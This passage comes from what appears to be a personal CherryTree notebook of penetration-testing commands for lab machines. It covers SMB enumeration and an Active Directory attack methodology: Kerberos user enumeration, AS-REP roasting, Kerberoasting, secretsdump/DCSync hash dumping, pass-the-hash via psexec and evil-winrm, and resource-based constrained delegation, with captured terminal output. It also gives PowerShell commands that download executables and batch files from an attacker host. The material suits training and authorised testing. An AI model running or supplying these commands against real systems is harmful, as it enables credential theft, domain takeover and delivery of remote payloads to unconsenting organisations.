        <codebox char_offset="108" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">chmod 600 ~/.ssh/authorized_keys</codebox>
        <codebox char_offset="281" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">ssh -L 8000:127.0.0.1:8000 sau@10.10.10.100</codebox>
      </node>
      <node name="nikto" unique_id="33" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687617619" ts_lastsave="1687805895">
        <rich_text scale="h2">Usage
</rich_text>
        <rich_text>
</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>


</rich_text>
        <rich_text scale="h2">using ports</rich_text>
        <rich_text>

</rich_text>
        <rich_text justification="left"></rich_text>
        <codebox char_offset="7" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">nikto -host 10.10.10.100 | tee output.log</codebox>
        <codebox char_offset="24" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">nikto -host 10.10.10.100 -port [port number 1], [port number 2], [port number 3]</codebox>
      </node>
      <node name="smb" unique_id="34" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687626207" ts_lastsave="1690064532">
        <rich_text scale="h1">Nmap</rich_text>
        <rich_text>


Enumerate shares: 

</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>

vuln scan:

</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>
_____________________________________
</rich_text>
        <rich_text scale="h2">Basics</rich_text>
        <rich_text>

</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>

</rich_text>
        <rich_text scale="h2">SMBClient copying everything to local</rich_text>
        <rich_text>


</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>


Also check if u can put something in it:

</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>

once put u can check accesing them and try something like this </rich_text>
        <rich_text link="node 98">URI File Attack</rich_text>
        <rich_text>

_________________________________________________

</rich_text>
        <rich_text scale="h1">SMBMap</rich_text>
        <rich_text>

</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>

with specific user:

</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>

list contents of a directory and subdirectory:
</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>
________________________________________________

</rich_text>
        <rich_text scale="h2">Enum4linux</rich_text>
        <rich_text>

</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>

or

</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>


_________________________________________

</rich_text>
        <rich_text scale="h2">Cadaver</rich_text>
        <rich_text>

Can be used to upload or download from smb shares

</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>

Asks for username
</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>

To copy from local to remote:

</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>

To copy from remote:

</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>


____________________________________________

Also check

</rich_text>
        <rich_text link="node 41">CrackMapExec</rich_text>
        <rich_text>
</rich_text>
        <codebox char_offset="27" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">nmap --script smb-enum-shares -p 139,445 10.10.10.100</codebox>
        <codebox char_offset="42" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">nmap --script=smb-vuln* --script-args=unsafe=1 -T5 10.10.10.100</codebox>
        <codebox char_offset="90" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">smbclient -N -L 10.10.10.100   </codebox>
        <codebox char_offset="133" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">smbclient //10.10.10.100/directoryName -U &lt;username&gt;

recurse ON
prompt OFF
mget *</codebox>
        <codebox char_offset="179" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">put &lt;filename&gt;</codebox>
        <codebox char_offset="321" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">smbmap -H 10.10.10.100</codebox>
        <codebox char_offset="345" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">smbmap -H 10.10.10.100 -u &lt;user&gt; -p &lt;pass&gt;</codebox>
        <codebox char_offset="395" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">smbmap -r DirectoryName -H 10.10.10.100</codebox>
        <codebox char_offset="459" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">enum4linux -a 10.10.10.100</codebox>
        <codebox char_offset="466" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">enum4linux -u 'guest' -p '' -a 10.10.10.100</codebox>
        <codebox char_offset="573" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">cadaver http://10.10.10.100</codebox>
        <codebox char_offset="594" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">Username: &lt;username&gt;
Password: &lt;password&gt;</codebox>
        <codebox char_offset="628" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">put &lt;filename&gt;</codebox>
        <codebox char_offset="653" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">get &lt;filename&gt;</codebox>
      </node>
      <node name="Active Directory" unique_id="35" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687686505" ts_lastsave="1697146388">
        <rich_text>
</rich_text>
        <rich_text scale="h2">Methodology:</rich_text>
        <rich_text>

☐ </rich_text>
        <rich_text link="node 36">nmap</rich_text>
        <rich_text>
☐ </rich_text>
        <rich_text link="node 34">smb</rich_text>
        <rich_text>
☐ </rich_text>
        <rich_text link="node 45">ldapsearch</rich_text>
        <rich_text>
☐ </rich_text>
        <rich_text link="node 89">88 Kerberos Auth</rich_text>
        <rich_text>
☐ checkwinpeas (add any other user or credentials)
☐ if u find </rich_text>
        <rich_text family="monospace">users</rich_text>
        <rich_text> make sure if there are matching users using </rich_text>
        <rich_text family="monospace">net user </rich_text>
        <rich_text>command or/and checking </rich_text>
        <rich_text family="monospace">dir c:/Users</rich_text>
        <rich_text>
☐ use blood hound (check and update priveleges)
☐ DCSync </rich_text>
        <rich_text link="node 100">DACL/DC-Sync</rich_text>
        <rich_text>
☐ run </rich_text>
        <rich_text link="node 85">secretdumps-GetAllHashes</rich_text>
        <rich_text> dump with ur initial set of credentials to get priviliged hashes
_______________________________________________________________



</rich_text>
        <rich_text link="webs https://exploit-notes.hdks.org/exploit/windows/active-directory/">https://exploit-notes.hdks.org/exploit/windows/active-directory/</rich_text>
        <rich_text>

</rich_text>
        <rich_text link="webs https://book.hacktricks.xyz/windows-hardening/active-directory-methodology">https://book.hacktricks.xyz/windows-hardening/active-directory-methodology</rich_text>
        <rich_text>
________________________________________
</rich_text>
        <rich_text link="webs https://zer1t0.gitlab.io/posts/attacking_ad/">https://zer1t0.gitlab.io/posts/attacking_ad/</rich_text>
        <rich_text>

</rich_text>
        <rich_text link="webs https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet">https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet</rich_text>
        <rich_text>

</rich_text>
        <rich_text link="webs https://tools.thehacker.recipes/">https://tools.thehacker.recipes/</rich_text>
        <rich_text>

</rich_text>
        <rich_text link="webs https://github.com/brianlam38/OSCP-2022/blob/main/cheatsheet-active-directory.md">https://github.com/brianlam38/OSCP-2022/blob/main/cheatsheet-active-directory.md</rich_text>
        <rich_text>
</rich_text>
        <rich_text link="webs https://gist.github.com/ssstonebraker/a1964b2f20acc8edb239409b6c4906ce">https://gist.github.com/ssstonebraker/a1964b2f20acc8edb239409b6c4906ce</rich_text>
        <rich_text>


Exe files to use for redteam:


</rich_text>
        <rich_text link="webs https://github.com/expl0itabl3/Toolies">https://github.com/expl0itabl3/Toolies</rich_text>
        <node name="88 Kerberos Auth" unique_id="89" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687808714" ts_lastsave="1697239503">
          <rich_text>

Check: </rich_text>
          <rich_text link="webs https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a">https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a</rich_text>
          <rich_text>

</rich_text>
          <rich_text scale="h1">Kerberos Authentication:</rich_text>
          <rich_text>
</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>

____________________________________________________________________________________

</rich_text>
          <rich_text justification="left"></rich_text>
          <codebox char_offset="109" justification="left" frame_width="1970" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">
# make sure u add the domain to the ip in host file
kerbrute userenum -d spookysec.local --dc spookysec.local userlist.txt -t 100 

or
_______________________________________________________________________

## once u have list of users from ldap search or somewhere else

./kerbrute_linux_amd64 userenum -d hutch.offsec --dc 10.10.10.100 usernames.txt


____________________________________________________________________________________

nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='DOMAIN'" 10.10.10.100
Nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='&lt;domain&gt;',userdb=/root/Desktop/usernames.txt 10.10.10.100

____________________________________________________________________________________


msf&gt; use auxiliary/gather/kerberos_enumusers

____________________________________________________________________________________


crackmapexec smb dominio.es  -u '' -p '' --users | awk '{print $4}' | uniq</codebox>
          <codebox char_offset="198" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="plain-text" highlight_brackets="1" show_line_numbers="0">

</codebox>
          <node name="ASRreproasting" unique_id="90" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687808714" ts_lastsave="1697234241">
            <rich_text scale="h1">Request AS_REP message</rich_text>
            <rich_text>

</rich_text>
            <rich_text scale="h3">Using Impacket</rich_text>
            <rich_text>


</rich_text>
            <rich_text justification="left"></rich_text>
            <rich_text>

or

</rich_text>
            <rich_text justification="left"></rich_text>
            <rich_text>

</rich_text>
            <codebox char_offset="41" justification="left" frame_width="1810" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">#Try all the usernames in usernames.txt
python GetNPUsers.py jurassic.park/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast
#Use domain creds to extract targets and target them
python GetNPUsers.py jurassic.park/triceratops:Sh4rpH0rns -request -format hashcat -outputfile hashes.asreproast

or

impacket-GetNPUsers spookysec.local/svc-admin -no-pass


or

python3 /opt/impacket/examples/GetNPUsers.py active.htb/admin -request -no-pass -dc-ip 10.10.10.100
</codebox>
            <codebox char_offset="48" justification="left" frame_width="1682" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">.\Rubeus.exe asreproast /format:hashcat /outfile:hashes.asreproast [/user:username]
Get-ASREPHash -Username VPN114user -verbose #From ASREPRoast.ps1 (https://github.com/HarmJ0y/ASREPRoast)</codebox>
          </node>
          <node name="Kerberoasting" unique_id="105" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1697239503" ts_lastsave="1697239640">
            <rich_text link="webs https://adsecurity.org/?p=3458">https://adsecurity.org/?p=3458</rich_text>
            <rich_text>

</rich_text>
            <rich_text link="webs https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/kerberoast">https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/kerberoast</rich_text>
            <rich_text>

</rich_text>
            <rich_text link="webs https://exploit-notes.hdks.org/exploit/windows/active-directory/kerberos-pentesting/">https://exploit-notes.hdks.org/exploit/windows/active-directory/kerberos-pentesting/</rich_text>
            <rich_text>


Run the following:

</rich_text>
            <rich_text justification="left"></rich_text>
            <codebox char_offset="226" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">impacket-GetUserSPNs -hashes &lt;lmhash&gt;:&lt;nthash&gt; example.local/username -outputfile hashes.txt
</codebox>
          </node>
        </node>
        <node name="Impacket" unique_id="83" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690727" ts_lastsave="1690043804">
          <node name="GetNPUsers-ASRreproasting" unique_id="84" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690728" ts_lastsave="1689882873">
            <rich_text scale="h1">Request AS_REP message</rich_text>
            <rich_text>

</rich_text>
            <rich_text scale="h3">Using Impacket</rich_text>
            <rich_text>


</rich_text>
            <rich_text justification="left"></rich_text>
            <rich_text>
</rich_text>
            <codebox char_offset="41" justification="left" frame_width="1810" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">###Try all the usernames in usernames.txt
impacket-GetNPUsers jurassic.park/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast

### Use domain creds to extract targets and target them
impacket-GetNPUsers jurassic.park/triceratops:Sh4rpH0rns -request -format hashcat -outputfile hashes.asreproast


### Get  ASREPMessage without pass  
impacket-GetNPUsers spookysec.local/svc-admin -no-pass


or

python3 /opt/impacket/examples/GetNPUsers.py domain.local/admin -request -no-pass -dc-ip 10.10.10.100
</codebox>
          </node>
          <node name="secretdumps-GetAllHashes" unique_id="85" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690728" ts_lastsave="1689887987">
            <rich_text>
</rich_text>
            <rich_text foreground="#569cd6" weight="heavy">### Dump All password hashes from a user account</rich_text>
            <rich_text> (DC Sync aka synchronizing DC)


</rich_text>
            <rich_text justification="left"></rich_text>
            <rich_text>

___________________________________________________________

</rich_text>
            <rich_text scale="h2">Getting All the hashes via ntds.dit files</rich_text>
            <rich_text>

</rich_text>
            <rich_text justification="left"></rich_text>
            <rich_text>

ex:


</rich_text>
            <rich_text justification="left"></rich_text>
            <rich_text>

</rich_text>
            <codebox char_offset="83" justification="left" frame_width="850" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">impacket-secretsdump -just-dc backup@spookysec.local
or 
impacket-secretsdump domain.local/user@10.10.10.100</codebox>
            <codebox char_offset="190" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">impacket-secretsdump -ntds &lt;ntds.dit&gt; -system &lt;SYSTEM&gt; LOCAL</codebox>
            <codebox char_offset="199" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">impacket-secretsdump -ntds temp/ntds.dit -system temp/SYSTEM LOCAL</codebox>
          </node>
          <node name="psexec - Passthe HAsh" unique_id="86" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690728" ts_lastsave="1687690770">
            <rich_text>Exploitation via pass the hash



</rich_text>
            <rich_text justification="left"></rich_text>
            <rich_text>
or


</rich_text>
            <rich_text justification="left"></rich_text>
            <rich_text>

</rich_text>
            <rich_text foreground="#d4d4d4">or</rich_text>
            <rich_text>


</rich_text>
            <rich_text justification="left"></rich_text>
            <rich_text>


</rich_text>
            <codebox char_offset="34" justification="left" frame_width="1314" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">impacket-psexec  domain.local/admin@10.10.10.100 -hashes randomLMHASH:oeasdNTLMHASH
</codebox>
            <codebox char_offset="41" justification="left" frame_width="50" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">sudo python2 psexec.py /administrator:Password123@10.10.10.100 </codebox>
            <codebox char_offset="49" justification="left" frame_width="50" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">impacket-psexec /administrator:Password123@10.10.10.100</codebox>
          </node>
          <node name="GetADUsers-enumerating Data from users" unique_id="87" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690728" ts_lastsave="1687690774">
            <rich_text>
</rich_text>
            <rich_text foreground="#79c0ff" weight="heavy">### This script will gather data about the domain's users and their corresponding email addresses.</rich_text>
            <rich_text>
</rich_text>
            <rich_text foreground="#c9d1d9">```</rich_text>
            <rich_text>
</rich_text>
            <rich_text justification="left"></rich_text>
            <rich_text>
</rich_text>
            <rich_text foreground="#c9d1d9">```</rich_text>
            <rich_text>
or

</rich_text>
            <rich_text justification="left"></rich_text>
            <rich_text>
</rich_text>
            <codebox char_offset="104" justification="left" frame_width="50" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">GetADUsers.py domain/user:password@IP
or
impacket-GetADUsers domain/user:password@IP</codebox>
            <codebox char_offset="114" justification="left" frame_width="50" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">impacket-GETADUsers -all domain.local/user -dc-ip 10.10.10.100</codebox>
          </node>
          <node name="GetUserSPNs - get TGTs" unique_id="88" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690728" ts_lastsave="1687690781">
            <rich_text>
</rich_text>
            <rich_text scale="h3">Get TGT for kerberoastable users</rich_text>
            <rich_text>

</rich_text>
            <rich_text justification="left"></rich_text>
            <codebox char_offset="35" justification="left" frame_width="50" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">Impacket-GetUserSPN -request -dc-ip 10.10.10.100 domain.local/user</codebox>
          </node>
          <node name="impacket-addcomputer" unique_id="96" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1690042606" ts_lastsave="1690043170">
            <rich_text>
</rich_text>
            <rich_text scale="h3">Resource Based Constrained Delegation</rich_text>
            <rich_text>
&#13;Let's use our access with the </rich_text>
            <rich_text family="monospace">l.livingstone</rich_text>
            <rich_text> account to create a new machine account on the domain. We can do with by using </rich_text>
            <rich_text family="monospace">impacket-addcomputer</rich_text>
            <rich_text>.
&#13;</rich_text>
            <rich_text justification="left"></rich_text>
            <rich_text family="monospace">&#13;
</rich_text>
            <rich_text>&#13;We can verify that this machine account was added to the domain by using our </rich_text>
            <rich_text family="monospace">evil-winrm</rich_text>
            <rich_text> session from before.
</rich_text>
            <rich_text justification="left"></rich_text>
            <rich_text>



With this account added, we now need a python script to help us manage the delegation rights. Let's grab a copy of </rich_text>
            <rich_text link="webs https://raw.githubusercontent.com/tothi/rbcd-attack/master/rbcd.py">rbcd.py</rich_text>
            <rich_text> and use it to set </rich_text>
            <rich_text family="monospace">msDS-AllowedToActOnBehalfOfOtherIdentity</rich_text>
            <rich_text> on our new machine account.
</rich_text>
            <rich_text justification="left"></rich_text>
            <rich_text family="monospace">&#13;
</rich_text>
            <rich_text>&#13;We can confirm that this was successful by using our </rich_text>
            <rich_text family="monospace">evil-winrm</rich_text>
            <rich_text> session.
</rich_text>
            <rich_text justification="left"></rich_text>
            <rich_text family="monospace">&#13;
</rich_text>
            <codebox char_offset="186" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">┌──(kali㉿kali)-[~]&#13;
└─$ impacket-addcomputer resourced.local/l.livingstone -dc-ip 10.10.10.100 -hashes :19a3a7550ce8c505c2d46b5e39d6f808 -computer-name 'ATTACK$' -computer-pass 'AttackerPC1!'&#13;
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation&#13;
&#13;
[*] Successfully added machine account ATTACK$ with password AttackerPC1!.</codebox>
            <codebox char_offset="299" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">&#13;*Evil-WinRM* PS C:\Users\L.Livingstone\Documents&gt; get-adcomputer attack&#13;
&#13;
&#13;
DistinguishedName : CN=ATTACK,CN=Computers,DC=resourced,DC=local&#13;
DNSHostName       :&#13;
Enabled           : True&#13;
Name              : ATTACK&#13;
ObjectClass       : computer&#13;
ObjectGUID        : 3fe60405-3692-4de9-8a20-917b234741b9&#13;
SamAccountName    : ATTACK$&#13;
SID               : S-1-5-21-537427935-490066102-1511301751-3601&#13;
UserPrincipalName :</codebox>
            <codebox char_offset="514" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">&#13;┌──(kali㉿kali)-[~]&#13;
└─$ wget https://raw.githubusercontent.com/tothi/rbcd-attack/master/rbcd.py  &#13;
...&#13;
┌──(kali㉿kali)-[~]&#13;
└─$ sudo python3 rbcd.py -dc-ip 192.168.120.181 -t RESOURCEDC -f 'ATTACK' -hashes :19a3a7550ce8c505c2d46b5e39d6f808 resourced\\l.livingstone                                  &#13;
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation&#13;
&#13;
[*] Starting Resource Based Constrained Delegation Attack against RESOURCEDC$&#13;
[*] Initializing LDAP connection to 192.168.120.181&#13;
[*] Using resourced\l.livingstone account with password ***&#13;
[*] LDAP bind OK&#13;
[*] Initializing domainDumper()&#13;
[*] Initializing LDAPAttack()&#13;
[*] Writing SECURITY_DESCRIPTOR related to (fake) computer `ATTACK` into msDS-AllowedToActOnBehalfOfOtherIdentity of target computer `RESOURCEDC`&#13;
[*] Delegation rights modified succesfully!&#13;
[*] ATTACK$ can now impersonate users on RESOURCEDC$ via S4U2Proxy</codebox>
            <codebox char_offset="591" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">&#13;*Evil-WinRM* PS C:\Users\L.Livingstone\Documents&gt; Get-adcomputer resourcedc -properties msds-allowedtoactonbehalfofotheridentity |select -expand msds-allowedtoactonbehalfofotheridentity&#13;
&#13;
Path Owner                  Access&#13;
---- -----                  ------&#13;
     BUILTIN\Administrators resourced\ATTACK$ Allow</codebox>
          </node>
          <node name="impacket-getST" unique_id="97" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1690043804" ts_lastsave="1690043838">
            <rich_text>We now need to get the administrator service ticket. We can do this by using </rich_text>
            <rich_text family="monospace">impacket-getST</rich_text>
            <rich_text> with our privileged machine account.
&#13;</rich_text>
            <rich_text justification="left"></rich_text>
            <codebox char_offset="130" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">┌──(kali㉿kali)-[~]&#13;
└─$ impacket-getST -spn cifs/resourcedc.resourced.local resourced/attack\$:'AttackerPC1!' -impersonate Administrator -dc-ip 10.10.10.100&#13;

Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation&#13;
&#13;
[*] Getting TGT for user&#13;
[*] Impersonating Administrator&#13;
[*]     Requesting S4U2self&#13;
[*]     Requesting S4U2Proxy&#13;
[*] Saving ticket in Administrator.ccache&#13;
</codebox>
          </node>
        </node>
        <node name="Pass The Hash Attack" unique_id="39" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687689619" ts_lastsave="1688335472">
          <rich_text>


</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>
or


</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>

with mimikatz
</rich_text>
          <rich_text link="webs https://blog.netwrix.com/2021/11/30/passing-the-hash-with-mimikatz/">https://blog.netwrix.com/2021/11/30/passing-the-hash-with-mimikatz/</rich_text>
          <rich_text>

</rich_text>
          <codebox char_offset="3" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">evil-winrm -i 10.10.10.100 -u Administrator -H 0e0363213e37b94221497260b0bcb4fc</codebox>
          <codebox char_offset="10" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">impacket-psexec  domain.local/admin@10.10.10.100 -hashes randomLMHASH:oeasdNTLMHASH</codebox>
        </node>
        <node name="Useful Powershell/CMD Commands" unique_id="40" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687689661" ts_lastsave="1696728088">
          <rich_text>
</rich_text>
          <rich_text scale="h2">
Setting password for user sophie</rich_text>
          <rich_text>


</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>


_______________________________________________________

&#13;• </rich_text>
          <rich_text family="monospace">Account Operators</rich_text>
          <rich_text> Group: According to official </rich_text>
          <rich_text link="webs https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-groups#bkmk-accountoperators">documentation</rich_text>
          <rich_text>, members of the </rich_text>
          <rich_text family="monospace">Account Operators</rich_text>
          <rich_text> group are allowed create and modify users and add them to non-protected groups ( non admin )
&#13;• </rich_text>
          <rich_text family="monospace">WriteDACL</rich_text>
          <rich_text> : The WriteDACL privilege gives a user the ability to add ACLs to an&#13;object. This means that we can add a user to this group and give them </rich_text>
          <rich_text link="webs https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/dcsync">DCSync</rich_text>
          <rich_text> privileges that can be used to abuse and grab credential and then shell via psexec
&#13;



__________________________________________________



</rich_text>
          <rich_text scale="h3">Adding a User </rich_text>
          <rich_text>

</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>
or

</rich_text>
          <rich_text scale="h3">Adding user to Admin  local group</rich_text>
          <rich_text>

</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>

Or adding them to any other group

</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>
 or with

</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>


Then accessing the machine
_________________________________________________________
</rich_text>
          <rich_text scale="h2">curl replacement in Powershell:</rich_text>
          <rich_text>
To downoad files:

</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>

pr
</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>
or

</rich_text>
          <rich_text family="monospace">$WebClient = New-Object System.Net.WebClient&#13;
$WebClient.DownloadFile("</rich_text>
          <rich_text family="monospace" foreground="#5ebdab">http://10.10.10.100</rich_text>
          <rich_text family="monospace">/navigating-code.exe","C:\navigating-code.exe")&#13;
</rich_text>
          <rich_text>&#13;    
or
&#13;</rich_text>
          <rich_text family="monospace">powershell.exe (New-Object System.Net.WebClient).DownloadFile('</rich_text>
          <rich_text family="monospace" foreground="#5ebdab">http://10.10.10.100</rich_text>
          <rich_text family="monospace">:8080/file.bat','filename.bat')&#13;
</rich_text>
          <rich_text>&#13;    



______________________________


</rich_text>
          <rich_text scale="h2">Force any particular computer to sync its GPOs imm</rich_text>
          <rich_text justification="left" scale="h2"></rich_text>
          <rich_text scale="h2">ediate</rich_text>
          <rich_text>




________________________________


</rich_text>
          <rich_text scale="h2">Use powershell specifically for all the below commands:
</rich_text>
          <rich_text>
</rich_text>
          <rich_text scale="h3">Testing Connection</rich_text>
          <rich_text justification="left" scale="h3"></rich_text>
          <rich_text scale="h3">/Access</rich_text>
          <rich_text>


____________________________________
</rich_text>
          <rich_text scale="h2">CMD</rich_text>
          <rich_text>


</rich_text>
          <rich_text scale="h3">Running as a different user on</rich_text>
          <rich_text justification="left" scale="h3"></rich_text>
          <rich_text scale="h3"> an AD</rich_text>
          <rich_text>




_____________________________________________


</rich_text>
          <rich_text scale="h2">Powershell Remoting</rich_text>
          <rich_text>

allows you to get a Powershell session in the remote machine, listens on 5985 and is enabled by default in the Windows Server machines.
 You can use Powershell Remoting from Windows by using many </rich_text>
          <rich_text link="webs https://docs.microsoft.com/en-us/powershell/scripting/learn/ps101/08-powershell-remoting?view=powershell-7.1">CmdLets and parameters</rich_text>
          <rich_text> available in Powershell. From a Linux machine you can use </rich_text>
          <rich_text link="webs https://github.com/Hackplayers/evil-winrm">evil-winrm</rich_text>
          <rich_text>.
 As well as in the RPC/SMB case, you can use a password, a NT hash or a Kerberos ticket to connect to the target machine. With evil-winrm, 
 you can pass them to the application as a parameters or configure the ccache file as in impacket. 
 In case of the Powershell cmdlets, you can use a password directly, but if you have a Kerberos ticket or a NT hash, you will need to inject them by using </rich_text>
